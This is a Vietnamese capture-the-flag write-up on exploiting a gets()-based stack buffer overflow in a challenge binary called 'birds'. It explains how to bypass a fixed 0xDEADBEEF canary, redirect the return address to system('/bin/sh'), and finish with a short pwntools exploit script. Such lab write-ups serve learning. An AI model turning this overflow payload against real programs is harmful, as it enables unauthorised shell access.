![image](https://github.com/user-attachments/assets/003f8bbd-5ac3-4065-9201-a8c601b95988)

Bài này cho 2 file gồm file src code và 1 file thực thi elf64:

![image](https://github.com/user-attachments/assets/48a4a454-b977-42d5-8598-2c732d2e32e9)

![image](https://github.com/user-attachments/assets/22aa3139-80af-4cb0-8987-0179b9ae4568)

Trong src code thì có sử dụng gets để nhận đầu vào, việc sử dụng gets có thể gây ra buffer overflow:

![image](https://github.com/user-attachments/assets/ce134a0f-a4a2-42fc-bffc-cf39c7a4d189)

Code khai báo canary có giá trị là 0xDEADBEEF, ngay sau khi nhập vào là check giá trị của canary xem có bằng với giá trị ban đầu không, nếu không thì exit

Vấn đề ở đây là tôi phải tìm cách lợi dụng buffer overflow và đi qua được kiểm tra điều kiện của canary rồi return về hàm win và gọi đến `system("/bin/sh")`

Tôi dùng ida pro để đọc code, để ý địa chỉ của cmp và tí dùng để đặt breakpoint, để ý luôn địa chỉ của `system("/bin/sh")`: 

![image](https://github.com/user-attachments/assets/e43d0574-0a23-418d-aac2-b0d20f9b035e)

Kịch bản là tôi sẽ return thẳng đến `system("/bin/sh")` luôn, tránh được kiểm tra điều kiện

Check trong ida pro của tôi thì biến v4, tức biến nhận giá trị đầu vào có độ lớn là 76, vậy thì tôi truyền vào 76 kí tự ví dụ như A là đủ

![image](https://github.com/user-attachments/assets/83723ed7-6708-4197-b8d5-1e1514a4e15e)

Tôi dùng `x/127wx $rsp` để xem stack, khi nhập 76 chữ A thì vừa đến đúng chỗ canary:

![image](https://github.com/user-attachments/assets/05fe3349-80ef-44bc-b4e6-3279f9ad58f0)

Giờ chỉ cần nối chuỗi `0xDEADBEEF` và địa chỉ tới `system("/bin/sh")` tức là 0x0004011DC để chạy và nó sẽ có dạng:

![image](https://github.com/user-attachments/assets/739075d2-c37f-4007-917c-4769654a364d)

Và đoạn code để exploit là:
```
from pwn import*

elf = context.binary = ELF('./birds')
io = process()

payload = b'A' * 76 + p32(0xdeadbeef) + p64(0x0) + p64(0x4011dc) + p64(0x0) + p64(elf.sym.win)
io.sendline(payload)

io.interactive()
```

![image](https://github.com/user-attachments/assets/08679699-b1d7-4add-8a83-942cff6dec90)
